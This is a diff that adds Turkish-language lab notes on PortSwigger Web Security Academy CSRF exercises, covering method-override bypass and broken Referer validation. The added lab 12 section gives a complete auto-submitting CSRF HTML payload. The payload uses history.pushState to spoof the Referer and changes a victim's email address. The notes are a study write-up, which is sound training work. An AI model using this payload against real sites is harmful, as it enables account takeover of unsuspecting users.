@@ -87,3 +87,40 @@ GET /my-account/change-email?email=hacker%401hacker.co HTTP/2 => not allowed
 _method=POST ile bu isteği geçiriyoruz.
 GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1 => isteğin geçtiğini görürüz.
 </script>
+
+
+
+
+
+
+
+
+
+
+
+12
+Laboratuvar: Bozuk Referer doğrulaması olan CSRF
+
+Mail adresi değiştiğimizde Referer başlığında adresi değiştirince kabul etmiyor ancak içerisinde domain eklediğimizde kabul ediyor.
+Web sitesi, beklenen etki alanını dizenin bir yerinde içerdiği sürece herhangi bir Referer başlığını kabul ediyor gibi görünüyor.
+Referer: https://arbitrary-incorrect-domain.net?$yourlabid.web-security-academy.net
+
+Exploit sunucusunda Head başlığının altına aşağıdaki etiketi yapıştırıp hazırladığımız poc'yi sunucuya inject ediyoruz.
+Referrer-Policy: unsafe-url
+
+
+JavaScript'i, işlevin üçüncü argümanının history.pushState()laboratuvar örneği URL'nizle birlikte bir sorgu dizesi içerecek şekilde düzenleyin:
+history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
+
+<html>
+    <body>
+    <script>history.pushState("", "", "/?$yourlabid.web-security-academy.net")</script>
+        <form method="POST" action="https://$yourlabid.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="hacker75@hacker81.co">
+            <input type="submit" value="Submit request" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
